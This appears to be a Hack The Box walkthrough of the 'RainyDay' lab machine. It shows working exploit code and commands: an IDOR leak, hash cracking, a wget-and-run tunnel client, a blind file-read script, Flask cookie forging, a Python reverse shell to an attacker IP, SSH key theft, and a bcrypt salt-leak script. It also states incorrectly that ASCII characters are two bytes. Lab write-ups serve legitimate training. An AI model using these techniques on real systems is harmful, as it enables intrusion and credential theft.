@@ -1,0 +1,407 @@
+                      RainyDay
+
+                                                                                  9th Nov 2022 / Document No D22.100.212
+
+                                                                                  Prepared By: amra
+
+                                                                                  Machine Author: InfoSecJack
+
+                                                                                  Difficulty: Hard
+
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+RainyDay is a hard Linux machine that starts with a web application that allows registered users to create
+and run containers on the remote machine. Enumerating the application it is discovered that registrations
+are closed. Further enumeration, reveals a REST API endpoint that suffers from an IDOR vulnerability, which
+leaks sensitive information such as usernames and password hashes. One of these hashes belonging to
+user gary can be cracked, which allows a potential attacker access to the web application. Once logged in,
+an attacker is able to create Docker containers and execute any command he wants on them. It turns out
+that the network that the containers are connected to is treated as an internal network and can be used
+to tunnel traffic to the dev vhost and the /api/healthcheck endpoint. The healthcheck endpoint can be
+used to read the secret token that's used to sign Flask session cookies. With this token, an attacker is able to
+forge a cookie for the user jack and access the container secrets . Once inside the container a very
+peculiar running process is discovered to be sharing its PID with the host system. The cwd of the process is
+linked to the /home/jack folder on the host machine. With the SSH key of jack in hand, the attacker is
+able to authenticate to the host machine. There, they discover that they are able to execute Python scripts
+as the user jack_adm but with heavy safety restrictions. These restrictions can be bypassed using a Use-
+After-Free vulnerability and execute arbitrary commands. The user jack_adm is able to execute a hashing
+script as the user root . The script uses the algorithm bcrypt which has a maximum length restriction.
+Due to bad design, an attacker is able to bruteforce the secret salt and crack the root password that was
+acquired from the web application. Finally, a password re-use scenario comes in to play and the cracked
+password works for the root user on the remote machine.
+
+Skills Required
+
+      Enumeration
+      Docker Knowledge
+      Flask session cookie signing
+      Hashing algorithms
+
+Skills Learned
+
+      Tunneling
+      Flask session cookie crafting
+      Docker/Host shared PIDs
+      Python exploitation for arbitrary code execution
+      Bruteforcing bcrypt hashes
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.228.65 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.129.228.65
+
+The Nmap output reveals two ports open. On port 22 an SSH server is running and on port 80 an Nginx web
+server. Since we don't, currently, have any valid SSH credentials we should begin our enumeration by
+visiting port 80 .
+Before we begin our enumeration process we notice that the Nmap output reveals the hostname
+RainyDay.htb , so we modify our /etc/hosts file accordingly.
+
+   echo "10.129.228.65 rainycloud.htb" | sudo tee -a /etc/hosts
+
+Nginx - Port 80
+Upon visiting http://rainycloud.htb we are presented with the following webpage.
+
+The main page gives us a lot of information to process. First of all, we get to know that if we manage to
+register/login we can create and run a Docker container. Then, the existence of a REST API is also hinted.
+Also, a container named secrets from the user jack seems to be running. At this point, we can try
+registering a new user by clicking the Login option at the top right, since the registration option is also
+present at the Login pages.
+We are transfered to a new page that we see the SIGN UP option. Let's try to create a new user.
+
+It seems like registering a new account is currently disabled so this is a dead end.
+Let's turn our attention to the other lead that we have, about the presence of a REST API. We can use tools
+like gobuster and ffuf to bruteforce directories and Vhosts, in order to locate the API endpoint.
+
+   gobuster dir -u http://rainycloud.htb -w /usr/share/seclists/Discovery/Web-
+   Content/raft-medium-directories-lowercase.txt
+
+   ffuf -u "http://rainycloud.htb" -H "Host: FUZZ.rainycloud.htb" -w
+   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
+We have discovered the /api endpoint but we have also discovered a new vhost called dev . Let's add this
+new entry to our /etc/hosts file.
+
+   echo "10.129.228.65 dev.rainycloud.htb" | sudo tee -a /etc/hosts
+Let's visit the new vhost before we proceed enumerating the /api endpoint.
+
+It seem like there some kind of IP filtering in place that denies us any access to this vhost. So, once again we
+turn our attention to the /api endpoint. It's high time we visited http://rainycloud.htb/api .
+
+Out of the four endpoints presented the /api/user/<id> seems to be the most promising one, given that
+the /api/healthcheck is available only internally. If we try to view the info for the user with id 1 by visiting
+http://rainycloud.htb/api/user/1 we get the following error.
+
+We can try various payloads at the <id> placeholder to bypass potential checks. Trying common payloads
+like SQL injection yields no results. Since the application specifically waits for an id we can safely assume
+that it expects an integer. With this in mind, let's try to pass a float as an argument.
+   curl http://rainycloud.htb/api/user/1.0
+
+It seems we have exploited an Insecure direct object references (IDOR) vulnerability and we are
+now able to dump information about the currently registered users. We only have three users (IDs form 1-3)
+with the following information.
+
+   "password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"j
+   ack"
+   "password":"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W","username":"r
+   oot"
+   "password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"g
+   ary"
+Now, we can create an empty file called hashes . We place the three hashes from the password field of the
+information we extracted from the /api/user/ endpoint inside the file and try to crack them using john .
+   john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+
+After a while, we get a result. One of the hashes cracked to rubberducky . Let's head back to the login page
+and try this password for the three users that we have.
+It turns out that we are able to login with the credentials gary:rubberducky .
+
+Foothold
+
+At this point, we can create a new container by clicking on New Container .
+
+We see that the container has been created successfully.
+
+Let's start enumerating the container. The Execute Command option seems like a good place to start.
+Running a simple whoami command prompts for a file download called command_output.txt with the
+result.
+Looking inside the container reveals no useful information. But, we've seen many endpoints during our
+enumeration phase that allow access only from the internal network. We can issue the ifconfig command
+to the container in order to check its network configuration.
+
+Indeed, the container does seem to have an internal network adapter. Let's use chisel to setup a SOCKS
+tunnel to route our traffic through the container.
+We have to upload the correct binary to the docker, configure it to be executable and then run the actual
+command. Since we want the tunnel to stay open indefinitely, we should use the Execute Command
+(background) option.
+First of all, we download the correct binary for our local machine from the release section. Then, we set it up
+to accept connections.
+
+   ./chisel server --reverse -p 8000
+Afterwards, we download the appropriate binary for the container and we setup a Python server on the
+same directory.
+   sudo python3 -m http.server 80
+Finally, we issue the following command on the container using the Execute Command (background)
+option.
+
+   sh -c 'wget 10.10.14.15/chisel -O /tmp/chisel ; chmod +x /tmp/chisel ; /tmp/chisel
+   client 10.10.14.15:8000 R:socks'
+
+    Note: Since we want to run multiple commands in one go, we follow the syntax given to us by the
+    webpage.
+
+Now that we have established a reverse SOCKS tunnel, we can try to access the dev.rainycloud.htb
+vhost. We can use the Firefox add-on called FoxyProxy. The first step after the installation is to configure it
+to use the SOCKS proxy.
+
+Then, with the Socks profile selected, we can visit http://dev.rainycloud.htb .
+This time, we don't get an Access Denied message meaning that we have successfully accessed the vhost
+from the internal network. Looking at our notes, we know that the /api/healthcheck is also available
+through the internal network, so, let's browse to http://dev.rainycloud.htb/api/healthcheck .
+It seems like an endpoint that checks the existence of files within the webserver. Also, we have the full path
+of the running application to be /var/www/rainycloud/app.py . What's interesting in this output is the 3rd
+result that seems to be a CUSTOM Regex filter to search in various files. By specifying the JSON keys file ,
+pattern and type we can read any file we have access to, by bruteforcing one character at a time.
+
+After some trial and error, we craft the following Python script to bruteforce files.
+
+   #!/usr/bin/python3
+
+   import string
+   import sys
+   import requests
+
+   s = requests.session()
+   proxies = {'http':'socks5://127.0.0.1:1080'}
+   r = s.post("http://dev.rainycloud.htb/login", data={"username": "gary", "password":
+   "rubberducky"}, proxies=proxies)
+
+   def get_hash(file, pattern):
+                 for x in range(10):
+                         try:
+                                r = s.post("http://dev.rainycloud.htb/api/healthcheck", data={"file":
+
+   file, "type": "CUSTOM", "pattern": pattern}, proxies=proxies)
+                                return r.json()['result']
+
+                         except:
+                                pass
+
+   extracted_file = "\n"
+   hex_file = ""
+
+   char2hex = {}
+   for char in string.printable:
+
+                 char2hex[char] = f'\\x{ord(char):02x}'
+
+   found_new = True
+   while True:
+
+                 if found_new == False:
+                                extracted_file += '\n'
+                                print(extracted_file.splitlines()[-1])
+                                break
+
+                 found_new = False
+                 if extracted_file[-1] == '\n':
+
+                                print(extracted_file.splitlines()[-1])
+
+                 for c in char2hex:
+                                if get_hash(sys.argv[1], f"^{hex_file}{char2hex[c]}"):
+                                              extracted_file += c
+                                              hex_file += char2hex[c]
+                                              found_new = True
+                                              break
+
+We can start using it by reading the source code of the application that we already know its path.
+
+   python3 file_read.py /var/www/rainycloud/app.py
+After a while, we can see that the Python web app is importing the SECRET_KEY from the secrets module.
+Since the secrets module is not standard in Python, chances are there is a secrets.py file in the same
+directory. We can try reading the file /var/www/rainycloud/secrets.py with the same script.
+
+   python3 file_read.py /var/www/rainycloud/secrets.py
+
+At this point we can either let the script dump the whole app.py file to further analyze the functionality or
+we can combine certain clues that hint as to where this SECRET_KEY might be used. From the list of
+imported modules we can safely deduce that the web application is built using Flask. Moreover, looking
+over at our browser, we can see a cookie called session .
+
+Let's use flask-unsign to verify if the SECRET_KEY is indeed the secret used to sign the Flask session cookies
+for authenticated user.
+flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-
+uqBA.o46_JCuR7NsHaRVAbUnwdhaoUfI' -w <( echo
+"f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67" )
+
+The signature is verified. This means that the SECRET_KEY is indeed used for signing sessions cookies. With
+that information, we can forge a cookie for the user jack that has a container called secrets running. To
+craft a malicious cookie, we can use the same tool.
+
+flask-unsign -s --secret                                              --cookie
+"f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"
+'{"username": "jack"}'
+
+Then, after we replace the cookie value on our browser and refresh the page we have access to the
+secrets container.
+This time, let's try to get a reverse shell on this container. First of all, we set up a listener on our local
+machine.
+
+   nc -lvnp 9001
+Then, we issue the following command using the Execute Command (background) .
+
+   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.54",9001));
+   [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+We have a shell on the container. We can use the following chain of commands to get a proper TTY shell.
+   python3 -c "import pty; pty.spawn('/bin/sh')"
+   CTRL + z
+   stty raw -echo; fg
+   Enter twice
+
+Usual enumeration steps include listing running processes to identify potential attack vectors.
+Our current user is executing a very peculiar process. This is the only clue that we can find after
+enumerating the Docker container. Docker, has an option to share PIDs over the containers and the host. It
+could be possible that we have a case like this here. Let's list the contents of the /proc/1183/cwd to find
+out from which directory this process is executed.
+
+The cwd of this peculiar process is linked to /home/jack , probably on the host. Going one step further, we
+can finally grab user.txt and the SSH key for the user jack from /proc/1183/cwd/.ssh/id_rsa .
+
+Lateral Movement
+
+Now, that we have the SSH key for the user jack on the host, we can use it to get a shell on the host.
+First of all, we have to set the correct permissions on the key file after we transfer it to our machine and
+then we can use it to authenticate as the user jack .
+
+   chmod 600 id_rsa
+   ssh -i id_rsa jack@rainycloud.htb
+
+We have a shell as the user jack on the host machine. One of the first things we check when we search for
+ways to escalate our privileges, is to find out if our user may run commands as other users or even root
+using sudo -l .
+It seems like, our user, is able to execute any file (probably a Python script) with a binary called
+safe_python . Let's create a script and try to execute it to verify our assumptions.
+
+   echo "print('Hello World')" > /tmp/test.py
+   sudo -u jack_adm /usr/bin/safe_python /tmp/test.py
+
+It worked as expected. Now, we can try a malicious Python script to spawn a shell for us.
+   echo "import os; os.system('/bin/bash')" > /tmp/shell.py
+   sudo -u jack_adm /usr/bin/safe_python /tmp/shell.py
+
+This time, we got an error that the built-in __import__ was not found. Using Google to search for ways to
+"code execution in every version of Python 3" leads us to this blog post. To test this, we have to transfer the
+exploit file over to the remote machine. First of all, we save it to our local machine and start a Python web
+server.
+
+   sudo python3 -m http.server 80
+Then, we transfer it to the remote machine and we execute it as the user jack_adm .
+This time around, we get arbitrary code execution as the user jack_adm .
+
+Privilege Escalation
+
+Once again, we may run sudo -l to check if the user jack_adm is configured to execute commands as an
+alternate user.
+
+Indeed, we have a new SUDO entry which informs us that the user jack_adm is able to execute the script
+/opt/hash_system/hash_password.py as the user root . Let's try and execute this script to properly
+enumerate it.
+
+It seems like a hashing tool where you provide a password of maximum 30 characters, which is rather
+strange. Moreover, it creates bcrypt hashes, the same type of hashes as the ones we have extracted from
+the web application. One of the uncracked hashes belongs to the user root so it may be possible that the
+uncrackable hash was created using this script. Our next step is to check if any secret salt is added to our
+password. A quick way to test this is to try cracking this hash with a wordlist that contains only the password
+we provided, in this case the word htb .
+
+   echo "htb" > clear_text
+   echo '$2b$05$unfEagMblpFZNf/PjvrFZ.KSE6Zkeg1or5xGR14zX5FlX5Cb4NmrW' > hash
+   john hash --wordlist=clear_text
+
+It has failed. This means that there is a secret salt that gets hashed with our password. Looking around
+the web for "bcrypt maximum password length" lands us to this. It turns out that Bcrypt has indeed a
+maximum password length of 71 bytes + 1 null byte. The limit imposed to us by the script is much lower
+than this. If we think about ASCII the limit translates to 36 characters since each ASCII character is exactly 2-
+bytes long. But, UTF-8 characters like emojis " " are 4-bytes long even though they count as a single
+character.
+
+Expanding upon that logic, we can craft a script that each time asks the hash_password.py script to
+
+generate a hash for the                                   AAA_ password. If the salt is
+
+appended after our password, then _ represents the first hashed character of this salt since, due to the
+
+limitation in size, everything else is effectively cut-off. We come up with the following script.
+
+import os
+import string
+import bcrypt
+
+emoji = " "
+other_char = "A"
+
+def get_padding(required_length):
+              # 4 is byte length of emoji
+              emojis = emoji * (required_length // 4)
+
+              other = other_char * (required_length % 4)
+
+              i = emojis + other
+              return i
+
+def leak(append=""):
+                 '''
+                 returns the hash returned by the program
+                 '''
+
+                 # bcrypt max is 72 bytes
+
+                 required_length = 71 - len(append)
+
+                 i = get_padding(required_length)
+
+                 print(f"[+] Getting Hash for {i}")
+
+                 out = os.popen(f"echo '{i}' | sudo /opt/hash_system/hash_password.py").read()
+                 h = out[out.index("Hash: ") + 6:].strip()
+                 print(f"[+] Hash: {h}")
+                 return h
+
+   def crack(h, append=""):
+                 required_length = 71 - len(append)
+                 i = get_padding(required_length) + append
+                 for s in string.printable:
+                                #print(i+s)
+                                if bcrypt.checkpw((i + s).encode(), h.encode()):
+                                              return s
+
+   if __name__ == "__main__":
+                 secret = ""
+                 try:
+                                while True:
+                                              print(f"[+] Secret: {secret}")
+                                              h = leak(secret)
+                                              c = crack(h, secret)
+                                              secret += c
+                 except TypeError:
+                                print(f"[+] Got Secret: {secret}")
+
+Once again, we transfer the file to the remote machine using our Python server and we execute it as the
+user jack_adm .
+We have successfully reconstructed the salt to H34vyR41n . Let's check if we can crack the hash for root
+by creating a custom rule for john. We have to append the following lines to the /etc/john/john.conf file.
+
+   [List.Rules:CustomRule]
+   Az"H34vyR41n"
+Then, we execute john .
+   john --rules:CustomRule --wordlist=/usr/share/wordlists/rockyou.txt root_hash
+
+This time, it has cracked successfully. Let's check for a password re-use scenario by using su - to switch to
+root with the 246813579H34vyR41n password.
+
+The password worked and we are the root user. We can find the root flag in /root/root.txt
+
